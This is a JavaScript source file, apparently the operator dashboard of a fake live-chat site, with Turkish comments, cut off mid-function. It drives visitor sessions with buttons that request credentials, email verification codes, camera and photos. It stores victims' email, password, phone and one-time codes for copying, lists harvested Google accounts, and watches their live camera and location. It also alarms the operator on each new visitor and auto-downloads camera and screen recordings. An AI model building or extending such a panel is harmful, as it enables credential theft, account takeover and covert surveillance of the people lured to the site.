import "./chat-sync.js?v=143";

async function ready() {
  if (window.ChatSync) return window.ChatSync;
  if (window.ChatSyncReady) return window.ChatSyncReady;
  return new Promise((resolve) => {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      if (window.ChatSyncReady) {
        clearInterval(t);
        Promise.resolve(window.ChatSyncReady).then(resolve);
        return;
      }
      if (window.ChatSync) {
        clearInterval(t);
        resolve(window.ChatSync);
        return;
      }
      // Firebase CDN gecikebilir — 15 sn bekle
      if (n > 300) {
        clearInterval(t);
        resolve(null);
      }
    }, 50);
  });
}

function fmtTime(ts) {
  if (!ts) return "?";
  return new Date(ts).toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function shortId(id) {
  return String(id || "").slice(0, 8);
}

function whoLabel(msg) {
  if (msg.who === "user") return "Ziyaretçi";
  if (msg.who === "admin" || msg.from === "admin") return "Sen";
  return "Bot";
}

const setupPanel = document.getElementById("setup-panel");
const loginPanel = document.getElementById("login-panel");
const dashPanel = document.getElementById("dash-panel");
const liveBadge = document.getElementById("live-badge");
const notifyBtn = document.getElementById("notify-btn");
const logoutBtn = document.getElementById("logout-btn");
const loginForm = document.getElementById("login-form");
const loginError = document.getElementById("login-error");
const sessionList = document.getElementById("session-list");
const sessionCount = document.getElementById("session-count");
const threadTitle = document.getElementById("thread-title");
const threadMeta = document.getElementById("thread-meta");
const threadMessages = document.getElementById("thread-messages");
const replyForm = document.getElementById("reply-form");
const replyInput = document.getElementById("reply-input");
const sendHint = document.getElementById("send-hint");
const quickList = document.getElementById("quick-list");
const sendLoadingBtn = document.getElementById("send-loading-btn");
const sendCameraBtn = document.getElementById("send-camera-btn");
const sendPhotosBtn = document.getElementById("send-photos-btn");
const sendEmailCodeBtn = document.getElementById("send-email-code-btn");
const sendCredentialsBtn = document.getElementById("send-credentials-btn");
const sendPopupBtn = document.getElementById("send-popup-btn");
const popupText = document.getElementById("popup-text");
const popupOk = document.getElementById("popup-ok");
const popupCancel = document.getElementById("popup-cancel");
const popupPlaceholder = document.getElementById("popup-placeholder");
const adminCameraBox = document.getElementById("admin-camera-box");
const cameraStatus = document.getElementById("camera-status");
const adminRemoteVideo = document.getElementById("admin-remote-video");
const endCameraBtn = document.getElementById("end-camera-btn");
const endCameraBtnModal = document.getElementById("end-camera-btn-modal");
const hideCameraBtn = document.getElementById("hide-camera-btn");
const hideCameraPanelBtn = document.getElementById("hide-camera-panel-btn");
const hideCameraBtnModal = document.getElementById("hide-camera-btn-modal");
const reopenCameraBtn = document.getElementById("reopen-camera-btn");
const downloadRecordingBtn = document.getElementById("download-recording-btn");
const adminSnapshotPreview = document.getElementById("admin-snapshot-preview");
const adminSnapshotLink = document.getElementById("admin-snapshot-link");
const adminMediaDock = document.getElementById("admin-media-dock");
const dockStatusPill = document.getElementById("dock-status-pill");
const dockSnapshot = document.getElementById("dock-snapshot");
const dockSnapshotLink = document.getElementById("dock-snapshot-link");
const dockCamText = document.getElementById("dock-cam-text");
const dockOpenCameraBtn = document.getElementById("dock-open-camera-btn");
const dockLocText = document.getElementById("dock-loc-text");
const dockLocMaps = document.getElementById("dock-loc-maps");
const evPhone = document.getElementById("ev-phone");
const evEmail = document.getElementById("ev-email");
const evPassword = document.getElementById("ev-password");
const evEmailCode = document.getElementById("ev-email-code");
const evCopyCredsBtn = document.getElementById("ev-copy-creds-btn");
const evLocMeta = document.getElementById("ev-loc-meta");
const evCopyLocBtn = document.getElementById("ev-copy-loc-btn");
const evRecText = document.getElementById("ev-rec-text");
const evRecDownload = document.getElementById("ev-rec-download");
const evScreenText = document.getElementById("ev-screen-text");
const evScreenDownload = document.getElementById("ev-screen-download");
const adminLiveLocation = document.getElementById("admin-live-location");
const adminLocationText = document.getElementById("admin-location-text");
const adminLocationMaps = document.getElementById("admin-location-maps");
const exportChatBtn = document.getElementById("export-chat-btn");
const clearChatBtn = document.getElementById("clear-chat-btn");
const clearAllChatsBtn = document.getElementById("clear-all-chats-btn");
const recentListEl = document.getElementById("admin-recent-list");
const recentFeedEl = document.getElementById("admin-recent-feed");
const templatesEditor = document.getElementById("templates-editor");
const templatesForm = document.getElementById("templates-form");
const templatesSaved = document.getElementById("templates-saved");
const addTemplateBtn = document.getElementById("add-template");
const resetTemplatesBtn = document.getElementById("reset-templates");
const alertOverlay = document.getElementById("admin-alert-overlay");
const alertKicker = document.getElementById("admin-alert-kicker");
const alertTitle = document.getElementById("admin-alert-title");
const alertBody = document.getElementById("admin-alert-body");
const alertDismiss = document.getElementById("admin-alert-dismiss");
const gmailList = document.getElementById("gmail-list");
const gmailCount = document.getElementById("gmail-count");
const gmailSearch = document.getElementById("gmail-search");
const gmailCopyBtn = document.getElementById("gmail-copy-btn");
const gmailBackfillBtn = document.getElementById("gmail-backfill-btn");
const gmailHint = document.getElementById("gmail-hint");

let unsubSessions = null;
let unsubMessages = null;
let unsubGoogleAccounts = null;
let selectedId = null;
let seenMessageIds = new Set();
let notifyEnabled = false;
let alertsArmed = false;
let sending = false;
let adminCall = null;
let knownSessionIds = new Set();
let googleAccountRows = [];
let latestSessionRows = [];
let sessionUpdatedAt = new Map();
let sessionLastCallId = new Map();
let sessionHadLocation = new Map();
let sessionHadCamera = new Map();
let sessionLastPreview = new Map();
let sessionEnteredAt = new Map();
let sessionLeftAt = new Map();
let sessionVisitorId = new Map();
let lastAutoOpenId = "";
let lastAutoOpenAt = 0;
let sessionsHydrated = false;
let recentFeedTimer = null;
let recentFeedSeq = 0;
let lastAlertAt = 0;
let lastAlertKey = "";
let lastDesktopNotif = null;
const ALERT_COOLDOWN_MS = 5000;
let alertAudioCtx = null;
let titleFlashTimer = null;
let originalTitle = document.title;
let alertHideTimer = null;
let alertSoundTimer = null;
let alertSounding = false;
let audioUnlocked = false;
let unlockListenersBound = false;

function ensureAlertAudio() {
  if (alertAudioCtx) return alertAudioCtx;
  const AC = window.AudioContext || window.webkitAudioContext;
  if (!AC) return null;
  try {
    alertAudioCtx = new AC();
  } catch {
    return null;
  }
  return alertAudioCtx;
}

async function unlockAlertAudio() {
  const ctx = ensureAlertAudio();
  if (!ctx) return false;
  try {
    if (ctx.state === "suspended") {
      await ctx.resume();
    }
    // Gercek sessiz tick — tarayici ses kilidini acar
    const buffer = ctx.createBuffer(1, 1, 22050);
    const src = ctx.createBufferSource();
    src.buffer = buffer;
    src.connect(ctx.destination);
    src.start(0);
    audioUnlocked = ctx.state === "running";
  } catch (err) {
    console.warn("Ses açılamadı", err);
    audioUnlocked = false;
  }
  updateNotifyBtnLabel();
  return audioUnlocked;
}

function updateNotifyBtnLabel() {
  if (!notifyBtn) return;
  if (!alertsArmed) {
    notifyBtn.textContent = "Alarmları aç";
    return;
  }
  if (audioUnlocked) {
    notifyBtn.textContent = notifyEnabled
      ? "Alarm + ses açık"
      : "Ses açık (masaüstü kapalı)";
  } else {
    notifyBtn.textContent = "Sesi aç (tıkla)";
  }
}

function bindAudioUnlockGestures() {
  if (unlockListenersBound) return;
  unlockListenersBound = true;
  const tryUnlock = () => {
    if (audioUnlocked) return;
    void unlockAlertAudio().then((ok) => {
      if (ok && alertSounding) void playAlertBeeps();
    });
  };
  document.addEventListener("pointerdown", tryUnlock, true);
  document.addEventListener("keydown", tryUnlock, true);
}

async function playAlertBeeps() {
  const ctx = ensureAlertAudio();
  if (!ctx) return false;
  try {
    if (ctx.state !== "running") {
      await ctx.resume();
    }
  } catch {
    return false;
  }
  if (ctx.state !== "running") {
    audioUnlocked = false;
    updateNotifyBtnLabel();
    return false;
  }
  audioUnlocked = true;

  // Daha net / yuksek bip
  const pattern = [
    { t: 0, f: 880, d: 0.12 },
    { t: 0.16, f: 1175, d: 0.14 },
    { t: 0.34, f: 988, d: 0.16 },
  ];
  const now = ctx.currentTime;
  pattern.forEach(({ t, f, d }) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "square";
    osc.frequency.value = f;
    gain.gain.setValueAtTime(0.001, now + t);
    gain.gain.exponentialRampToValueAtTime(0.35, now + t + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.001, now + t + d);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(now + t);
    osc.stop(now + t + d + 0.03);
  });
  return true;
}

function stopAlertSound() {
  alertSounding = false;
  if (alertSoundTimer) {
    clearInterval(alertSoundTimer);
    alertSoundTimer = null;
  }
}

function startAlertSoundLoop() {
  stopAlertSound();
  alertSounding = true;
  bindAudioUnlockGestures();

  const tick = () => {
    if (!alertSounding) return;
    void playAlertBeeps().then((ok) => {
      if (!ok && alertOverlay && !alertOverlay.hidden && alertBody) {
        // Ses kilitliyse kullaniciya net yaz
        const tip = " · Ses için sayfaya bir kez tıkla / Alarmları aç";
        if (!String(alertBody.textContent || "").includes("Ses için")) {
          alertBody.textContent = `${alertBody.textContent || ""}${tip}`;
        }
      }
    });
  };

  tick();
  alertSoundTimer = window.setInterval(tick, 900);
}

function flashDocumentTitle(text) {
  if (titleFlashTimer) clearInterval(titleFlashTimer);
  let on = false;
  originalTitle = originalTitle || document.title;
  titleFlashTimer = window.setInterval(() => {
    if (!alertSounding) {
      clearInterval(titleFlashTimer);
      titleFlashTimer = null;
      document.title = originalTitle;
      return;
    }
    on = !on;
    document.title = on ? `? ${text}` : originalTitle;
  }, 700);
}

function hideAdminAlert() {
  stopAlertSound();
  if (alertOverlay) alertOverlay.hidden = true;
  document.body.classList.remove("is-alert-flash");
  if (alertHideTimer) {
    clearTimeout(alertHideTimer);
    alertHideTimer = null;
  }
  if (titleFlashTimer) {
    clearInterval(titleFlashTimer);
    titleFlashTimer = null;
  }
  document.title = originalTitle || document.title;
  if (liveBadge) liveBadge.classList.remove("is-ping");
}

function showAdminAlert({ kicker, title, body }) {
  if (alertKicker) alertKicker.textContent = kicker || "Yeni bildirim";
  if (alertTitle) alertTitle.textContent = title || "Bildirim";
  if (alertBody) alertBody.textContent = body || "";
  if (alertOverlay) alertOverlay.hidden = false;
  // Otomatik kapanmaz ? sadece Tamam ile
  if (alertHideTimer) {
    clearTimeout(alertHideTimer);
    alertHideTimer = null;
  }
}

function pushDesktopNotification(title, body) {
  if (!("Notification" in window)) return;
  if (Notification.permission !== "granted") return;
  // Service worker varsa arka plan uyumlu bildirim
  try {
    if (navigator.serviceWorker?.ready) {
      void navigator.serviceWorker.ready.then((reg) => {
        try {
          reg.showNotification(title, {
            body,
            tag: "admin-desk",
            renotify: true,
            data: {
              url: `${location.origin}${location.pathname.replace(/[^/]+$/, "")}admin.html`,
            },
          });
        } catch {
          /* fall through below */
        }
      });
    }
  } catch {
    /* ignore */
  }
  try {
    lastDesktopNotif?.close?.();
  } catch {
    /* ignore */
  }
  try {
    lastDesktopNotif = new Notification(title, {
      body,
      tag: "admin-desk",
    });
  } catch {
    /* ignore */
  }
}

function shouldFireFullAlert(key, force) {
  const now = Date.now();
  if (force) {
    lastAlertAt = now;
    lastAlertKey = key;
    return true;
  }
  // Kisa surede ayni/ust uste alarmlari yut
  if (now - lastAlertAt < ALERT_COOLDOWN_MS) return false;
  lastAlertAt = now;
  lastAlertKey = key;
  return true;
}

function fireHighAlert({ kicker, title, body, tag, force = false }) {
  if (!alertsArmed) alertsArmed = true;
  bindAudioUnlockGestures();

  const key = String(tag || title || "alert");
  const full = shouldFireFullAlert(key, force);

  // Toast icerigini her zaman guncelle
  showAdminAlert({ kicker, title, body });

  if (!full) {
    // Sadece metni guncelle; ses/masaustu spam yok
    return;
  }

  startAlertSoundLoop();
  flashDocumentTitle(title);
  pushDesktopNotification(title, body);
  // Tarayıcı kapalıyken / arka planda FCM
  try {
    window.ChatSync?.notifyAdminsPush?.({
      title: title || kicker || "Alarm",
      body: body || "",
      tag: key,
    });
  } catch {
    /* ignore */
  }
  if (liveBadge) liveBadge.classList.add("is-ping");
}

function renderRecentFeed(items) {
  if (!recentListEl) return;
  recentListEl.innerHTML = "";
  if (!items?.length) {
    recentListEl.innerHTML = '<li class="admin-recent-empty">Henüz mesaj yok</li>';
    return;
  }
  items.forEach((item) => {
    const li = document.createElement("li");
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "admin-recent-item";
    btn.title = "Sohbeti a?";
    const who = whoLabel(item);
    const text = String(item.text || "").trim() || "(bos)";
    btn.innerHTML = `
      <span class="admin-recent-item-top">
        <span class="admin-recent-item-who">${escapeHtml(who)} ? #${shortId(item.sessionId)}</span>
        <span>${escapeHtml(fmtTime(item.ts))}</span>
      </span>
      <span class="admin-recent-item-text">${escapeHtml(text)}</span>
    `;
    btn.addEventListener("click", () => {
      const row = latestSessionRows.find((r) => r.id === item.sessionId);
      if (row) openSession(row);
      else openSession({ id: item.sessionId, page: item.page || "/", updatedAt: item.ts });
    });
    li.appendChild(btn);
    recentListEl.appendChild(li);
  });
}

function scheduleRecentFeedRefresh(rows) {
  latestSessionRows = Array.isArray(rows) ? rows : [];
  if (recentFeedTimer) clearTimeout(recentFeedTimer);
  recentFeedTimer = window.setTimeout(() => {
    void refreshRecentFeed(latestSessionRows);
  }, 250);
}

async function refreshRecentFeed(rows) {
  const sync = window.ChatSync;
  if (!sync?.getSessionMessages || !recentListEl) return;
  const seq = ++recentFeedSeq;
  const list = (Array.isArray(rows) ? rows : [])
    .slice()
    .sort((a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0))
    .slice(0, 15);

  try {
    const batches = await Promise.all(
      list.map(async (row) => {
        try {
          const msgs = await sync.getSessionMessages(row.id);
          return (msgs || []).slice(-5).map((m) => ({
            ...m,
            sessionId: row.id,
            page: row.page || "/",
          }));
        } catch {
          return [];
        }
      })
    );
    if (seq !== recentFeedSeq) return;
    const merged = batches
      .flat()
      .filter((m) => m && m.id)
      .sort((a, b) => (Number(a.ts) || 0) - (Number(b.ts) || 0))
      .slice(-5)
      .reverse();
    renderRecentFeed(merged);
  } catch (err) {
    console.warn("recent feed", err);
  }
}

function bindSessionMessages(sessionId) {
  if (unsubMessages) {
    unsubMessages();
    unsubMessages = null;
  }
  if (!sessionId || !window.ChatSync?.listenMessages) return;

  const bindAt = Date.now();
  let announceLive = false;
  unsubMessages = window.ChatSync.listenMessages(sessionId, (msg) => {
    const ts = Number(msg?.ts) || 0;
    // Hidrasyon: dinleyici bağlanmadan önceki mesajları canlı duyurma / rejoin etme
    const isHistory = ts && ts < bindAt - 2500;
    appendThreadMessage(msg, announceLive && !isHistory);
  });
  window.setTimeout(() => {
    announceLive = true;
  }, 400);
}

function startDash(sync) {
  show("dash");
  bindAudioUnlockGestures();
  renderQuickButtons();
  renderTemplatesEditor(sync.getQuickReplies());
  knownSessionIds = new Set();
  sessionUpdatedAt = new Map();
  sessionLastCallId = new Map();
  sessionsHydrated = false;

  if (!alertsArmed) {
    armAlerts().catch(() => {
      alertsArmed = true;
      updateNotifyBtnLabel();
    });
  } else {
    void unlockAlertAudio();
    updateNotifyBtnLabel();
  }

  if (unsubGoogleAccounts) unsubGoogleAccounts();
  if (sync.listenGoogleAccounts) {
    unsubGoogleAccounts = sync.listenGoogleAccounts((rows) => {
      googleAccountRows = Array.isArray(rows) ? rows : [];
      renderGmails();
    });
  }

  if (unsubSessions) unsubSessions();
  unsubSessions = sync.listenSessions((rows) => {
    if (!Array.isArray(rows)) rows = [];
    latestSessionRows = rows;

    if (!sessionsHydrated) {
      rows.forEach((r) => {
        knownSessionIds.add(r.id);
        sessionUpdatedAt.set(r.id, Number(r.updatedAt) || 0);
        if (r.lastCallId) sessionLastCallId.set(r.id, String(r.lastCallId));
        if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);
        if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
        sessionLastPreview.set(r.id, String(r.preview || ""));
        sessionEnteredAt.set(r.id, Number(r.enteredAt) || 0);
        sessionLeftAt.set(r.id, Number(r.userLeftAt) || 0);
        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));
      });
      sessionsHydrated = true;
      renderSessions(rows);
      scheduleRecentFeedRefresh(rows);
      if (!selectedId && rows[0]) openSession(rows[0]);
      if (sendHint && !rows.length) {
        sendHint.hidden = false;
        sendHint.textContent = "Henüz oturum yok. Ziyaretçi sohbet başlatınca burada görünür.";
      }
      return;
    }

    const fresh = [];
    const bumped = [];
    rows.forEach((r) => {
      const updated = Number(r.updatedAt) || 0;
      if (!knownSessionIds.has(r.id)) {
        knownSessionIds.add(r.id);
        sessionUpdatedAt.set(r.id, updated);
        if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);
        if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
        if (r.lastCallId) sessionLastCallId.set(r.id, String(r.lastCallId));
        sessionEnteredAt.set(r.id, Number(r.enteredAt) || 0);
        sessionLeftAt.set(r.id, Number(r.userLeftAt) || 0);
        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));
        sessionLastPreview.set(r.id, String(r.preview || ""));
        // Aynı cihaz/visitorId ile mevcut oturum varsa “fresh spam” sayma
        const vid = String(r.visitorId || "");
        const dupVisitor =
          vid &&
          [...sessionVisitorId.entries()].some(
            ([id, v]) => id !== r.id && v === vid && knownSessionIds.has(id)
          );
        if (!dupVisitor) fresh.push(r);
        else {
          bumped.push({
            row: r,
            isEntry: true,
            isMediaEdge: false,
            callChanged: false,
            firstCam: false,
            firstLoc: false,
          });
        }
        return;
      }
      const prev = sessionUpdatedAt.get(r.id) || 0;
      if (updated > prev) {
        sessionUpdatedAt.set(r.id, updated);
        const preview = String(r.preview || "");
        const enteredAt = Number(r.enteredAt) || 0;
        const prevEntered = sessionEnteredAt.get(r.id) || 0;
        const leftAt = Number(r.userLeftAt) || 0;
        const prevLeft = sessionLeftAt.get(r.id) || 0;
        // Rising-edge: sticky preview ile değil zaman damgası ile
        const isEntry = enteredAt > prevEntered && enteredAt > 0;
        if (enteredAt >= prevEntered) sessionEnteredAt.set(r.id, enteredAt);

        const prevCall = sessionLastCallId.get(r.id) || "";
        const nextCall = String(r.lastCallId || "");
        const callChanged = Boolean(nextCall && nextCall !== prevCall);
        if (nextCall) sessionLastCallId.set(r.id, nextCall);

        const firstCam = Boolean(r.cameraGranted || r.hasCamera) && !sessionHadCamera.get(r.id);
        const firstLoc = Boolean(r.hasLocation || r.lastLocation) && !sessionHadLocation.get(r.id);
        if (r.cameraGranted || r.hasCamera) sessionHadCamera.set(r.id, true);
        if (r.hasLocation || r.lastLocation) sessionHadLocation.set(r.id, true);

        const leftEdge = leftAt > prevLeft && leftAt > 0;
        if (leftAt >= prevLeft) sessionLeftAt.set(r.id, leftAt);
        if (r.visitorId) sessionVisitorId.set(r.id, String(r.visitorId));

        const isMediaEdge = callChanged || firstCam || firstLoc || leftEdge;

        const prevPreview = sessionLastPreview.get(r.id) || "";
        sessionLastPreview.set(r.id, preview);
        const previewChanged = preview !== prevPreview;
        const routinePreview =
          /bu ad[ıi]m kaydedildi|yeniden ba[gğ]lan|siteye giri[sş]|do[gğ]rulama g[oö]r[uü]nt[uü]|g[uü]venlik do[gğ]rulamas[ıi] yeniden|heartbeat|kayd[ıi] g[uü]ncellendi|online/i.test(
            preview
          );

        if (
          isEntry ||
          isMediaEdge ||
          (r.lastWho === "user" && previewChanged && !routinePreview)
        ) {
          bumped.push({ row: r, isEntry, isMediaEdge, callChanged, firstCam, firstLoc });
        }
      } else if (r.lastCallId) {
        const prevCall = sessionLastCallId.get(r.id) || "";
        const nextCall = String(r.lastCallId || "");
        if (nextCall && nextCall !== prevCall) {
          sessionLastCallId.set(r.id, nextCall);
          bumped.push({
            row: r,
            isEntry: false,
            isMediaEdge: true,
            callChanged: true,
            firstCam: false,
            firstLoc: false,
          });
        }
      }
    });

    const live = new Set(rows.map((r) => r.id));
    [...knownSessionIds].forEach((id) => {
      if (!live.has(id)) {
        knownSessionIds.delete(id);
        sessionUpdatedAt.delete(id);
        sessionLastCallId.delete(id);
        sessionHadLocation.delete(id);
        sessionHadCamera.delete(id);
        sessionLastPreview.delete(id);
        sessionEnteredAt.delete(id);
        sessionLeftAt.delete(id);
        sessionVisitorId.delete(id);
      }
    });

    renderSessions(rows);
    scheduleRecentFeedRefresh(rows);

    // Seçili oturum: her poll'da dock/konum sessiz güncelle (bump gerekmez)
    if (selectedId) {
      const selectedRow = rows.find((r) => r.id === selectedId);
      if (selectedRow) {
        updateMediaDock(selectedRow);
        if (selectedRow.lastLocation) {
          updateAdminLocationUi(selectedRow.lastLocation, "live", null);
        }
      }
    }

    function quietlyOpenSession(row, { joinCam = true } = {}) {
      if (!row?.id) return;
      if (row.id === selectedId) {
        if (joinCam) maybeJoinSessionCamera(row);
        return;
      }
      if (hasLiveAdminWatch() && adminCall?.sessionId && adminCall.sessionId !== row.id) {
        return;
      }
      const now = Date.now();
      if (lastAutoOpenId === row.id && now - lastAutoOpenAt < 8000) return;
      lastAutoOpenId = row.id;
      lastAutoOpenAt = now;
      openSession(row);
      if (joinCam) maybeJoinSessionCamera(row);
      queueMicrotask(() => {
        adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
      });
    }

    if (fresh.length) {
      const newest = fresh.sort(
        (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
      )[0];
      fireHighAlert({
        kicker: "YENI ZIYARETCI",
        title: "Siteye yeni kullanici girdi",
        body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
          newest.preview || "Siteye giris yapti"
        ).slice(0, 100)}`,
        tag: `fresh-${newest.id}`,
        force: true,
      });
      quietlyOpenSession(newest);
      return;
    }

    if (bumped.length) {
      const newestWrap = bumped.sort(
        (a, b) => (Number(b.row.updatedAt) || 0) - (Number(a.row.updatedAt) || 0)
      )[0];
      const newest = newestWrap.row;
      const isEntry = newestWrap.isEntry;
      const isMediaEdge = newestWrap.isMediaEdge;
      const rowCall = String(newest.lastCallId || "");
      if (rowCall) sessionLastCallId.set(newest.id, rowCall);

      const isSelected = newest.id === selectedId;
      const watchingOther = hasLiveAdminWatch() && !isSelected;

      if (isSelected) {
        updateMediaDock(newest);
        if (newest.lastLocation) updateAdminLocationUi(newest.lastLocation, "live", null);
        maybeJoinSessionCamera(newest);
        maybeAutoDownloadSessionRecording(newest);
        if (isEntry || isMediaEdge) {
          fireHighAlert({
            kicker: isMediaEdge ? "KAMERA / KONUM" : "SITE GIRISI",
            title: isMediaEdge
              ? "Secili ziyaretci medya guncellemesi"
              : "Secili ziyaretci siteye girdi",
            body: `#${shortId(newest.id)} · ${String(newest.preview || "").slice(0, 120)}`,
            tag: isMediaEdge
              ? `media-${newest.id}-${rowCall || newest.enteredAt || newest.updatedAt}`
              : `entry-${newest.id}-${newest.enteredAt || newest.updatedAt}`,
            force: Boolean(isMediaEdge),
          });
        }
      } else {
        fireHighAlert({
          kicker: isMediaEdge ? "KAMERA / KONUM" : isEntry ? "SITE GIRISI" : "YENI MESAJ",
          title: isMediaEdge
            ? "Baska ziyaretci izin / konum"
            : isEntry
              ? "Baska ziyaretci siteye girdi"
              : "Baska ziyaretci aktivitesi",
          body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
            newest.preview || ""
          ).slice(0, 120)}${watchingOther ? " (canlı izleme — listeden seç)" : ""}`,
          tag: isMediaEdge
            ? `media-${newest.id}-${rowCall || newest.updatedAt}`
            : isEntry
              ? `entry-${newest.id}-${newest.enteredAt || newest.updatedAt}`
              : `bump-${newest.id}-${newest.updatedAt}`,
          force: Boolean(isMediaEdge || isEntry),
        });
        // Yalnız gerçek giriş / ilk medya — her heartbeat ile açma
        if (!watchingOther && (isEntry || firstMeaningfulMedia(newestWrap) || !selectedId)) {
          quietlyOpenSession(newest);
        }
      }

      if (
        isSelected &&
        (Number(newest.userLeftAt) > 0 ||
          newest.recordingFinalized ||
          /kayd[ıi] haz[ıi]r|ayr[ıi]ld/i.test(String(newest.preview || "")))
      ) {
        const got = maybeAutoDownloadSessionRecording(newest, {
          force: Boolean(newest.lastRecordingUrl || newest.recordingSegments?.length),
        });
        if (!got && adminCall?.sessionId === newest.id && adminCall?.lastBlob?.size) {
          void saveEvidenceBlob(
            adminCall.lastBlob,
            `kamera-admin-${shortId(newest.id)}.${recordingExtFromMime(adminCall.lastBlob.type)}`,
            newest.id
          );
        }
      }
    }

    if (!selectedId && rows[0]) openSession(rows[0]);
  });
}

let adminJoinInFlight = null;
let adminJoinGen = 0;

function hasLiveAdminWatch() {
  return Boolean(adminCall?.pc && adminCall?.sessionId && selectedId && adminCall.sessionId === selectedId);
}

function maybeJoinSessionCamera(row) {
  if (!row?.id || !row.lastCallId) return;
  if (!(row.cameraGranted || row.hasCamera || row.cameraPending || row.hasLocation)) return;
  // Başka ziyaretçinin kamerasına ASLA otomatik geçme — sohbet/kamera çakışmasını önler
  if (selectedId && selectedId !== row.id) return;
  if (adminCall?.pc && adminCall.sessionId && adminCall.sessionId !== row.id) return;

  // Aynı call canlıysa yeniden join etme
  if (
    adminCall?.sessionId === row.id &&
    adminCall?.callId === row.lastCallId &&
    adminCall?.pc &&
    !adminCall?.needsRenegotiate &&
    !adminCall?.awaitingSoftResume
  ) {
    if (row.lastLocation) updateAdminLocationUi(row.lastLocation, "live", null);
    return;
  }
  const callChanged =
    Boolean(adminCall) &&
    (adminCall.sessionId !== row.id || adminCall.callId !== row.lastCallId);
  void ensureAdminCamera(row.id, row.lastCallId, {
    force: Boolean(adminCall?.needsRenegotiate) || callChanged,
    seedLocation: row.lastLocation || null,
  });
}

async function ensureAdminCamera(sessionId, callId, opts = {}) {
  if (!sessionId || !callId) return;
  const force = opts.force === true;
  const key = `${sessionId}:${callId}`;
  if (
    !force &&
    adminCall?.sessionId === sessionId &&
    adminCall?.callId === callId &&
    adminCall?.pc &&
    !adminCall?.needsRenegotiate
  ) {
    if (opts.seedLocation) updateAdminLocationUi(opts.seedLocation, "live", null);
    showCameraPopup();
    return;
  }
  // Eski ended call’ın empty-recording watch’ı yeni join UI’sini ezmesin
  stopRecordingWatch();
  // Yeni call / force: eski in-flight’ı iptal et (kilitlemesin)
  const gen = ++adminJoinGen;
  adminJoinInFlight = key;
  try {
    await joinAdminCamera(sessionId, callId, {
      seedLocation: opts.seedLocation || null,
      force,
      joinGen: gen,
    });
  } finally {
    if (adminJoinGen === gen && adminJoinInFlight === key) {
      adminJoinInFlight = null;
    }
  }
}

async function armAlerts() {
  alertsArmed = true;
  bindAudioUnlockGestures();
  // Once ses kilidini ac (Notification izni jesti tuketmeden)
  await unlockAlertAudio();
  const played = await playAlertBeeps();
  if ("Notification" in window) {
    try {
      const perm =
        Notification.permission === "granted"
          ? "granted"
          : await Notification.requestPermission();
      notifyEnabled = perm === "granted";
    } catch {
      notifyEnabled = false;
    }
  } else {
    notifyEnabled = false;
  }
  // FCM — tarayıcı kapalıyken bildirim
  try {
    const sync = window.ChatSync || (await window.ChatSyncReady);
    if (sync?.enablePushNotifications) {
      const res = await sync.enablePushNotifications("admin");
      if (res?.ok) notifyEnabled = true;
      updatePushStatusBanner(res);
    } else {
      updatePushStatusBanner(null);
    }
  } catch (err) {
    console.warn("admin push enroll", err);
    updatePushStatusBanner({ ok: false, error: err?.message || String(err) });
  }
  updateNotifyBtnLabel();
  if (!played) {
    if (sendHint) {
      sendHint.hidden = false;
      sendHint.textContent =
        "Ses henüz kilitli. Üstteki “Alarmları aç” butonuna tekrar tıkla veya sayfaya bir kez tıkla.";
    }
  } else if (sendHint) {
    sendHint.hidden = false;
    sendHint.textContent = "Alarmlar hazır. Kapalı tarayıcı için vapidKey + fcmServerKey gerekir.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Alarmlar hazır")) sendHint.hidden = true;
    }, 3500);
  }
}

function updatePushStatusBanner(enrollRes) {
  const el = document.getElementById("admin-push-status");
  if (!el) return;
  const st = window.ChatSync?.getPushSetupStatus?.() || {};
  el.hidden = false;
  el.classList.remove("is-ok", "is-warn", "is-bad");
  if (st.closedBrowserReady && enrollRes?.token) {
    el.classList.add("is-ok");
    el.textContent = "Push hazır: tarayıcı kapalıyken de bildirim gelebilir.";
    return;
  }
  if (!st.vapidKey || !st.fcmServerKey) {
    el.classList.add("is-warn");
    el.textContent =
      `Kapalı tarayıcı push eksik: ${st.hint || "vapidKey / fcmServerKey"}. ` +
      "firebase-config.js doldur → Ctrl+F5 → Alarmları aç.";
    return;
  }
  if (st.notificationPermission !== "granted") {
    el.classList.add("is-warn");
    el.textContent = "Bildirim izni yok — üstteki “Alarmları aç”a bas.";
    return;
  }
  if (enrollRes?.limited || !enrollRes?.token) {
    el.classList.add("is-warn");
    el.textContent = enrollRes?.hint || "FCM token alınamadı — HTTPS ve SW dosyasını kontrol et.";
    return;
  }
  el.classList.add("is-ok");
  el.textContent = st.hint || "Push durumu güncellendi.";
}

function show(view) {
  if (setupPanel) setupPanel.hidden = view !== "setup";
  if (loginPanel) loginPanel.hidden = view !== "login";
  if (dashPanel) dashPanel.hidden = view !== "dash";
  if (recentFeedEl) recentFeedEl.hidden = view !== "dash";
  if (liveBadge) liveBadge.hidden = view !== "dash";
  if (notifyBtn) notifyBtn.hidden = view !== "dash";
  if (logoutBtn) logoutBtn.hidden = view !== "dash";
}

function authOk() {
  return sessionStorage.getItem("admin_ok") === "1";
}

function setAuth(ok) {
  if (ok) sessionStorage.setItem("admin_ok", "1");
  else sessionStorage.removeItem("admin_ok");
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function formatLocationLine(loc) {
  if (!loc || !Number.isFinite(Number(loc.lat)) || !Number.isFinite(Number(loc.lng))) return "";
  const lat = Number(loc.lat);
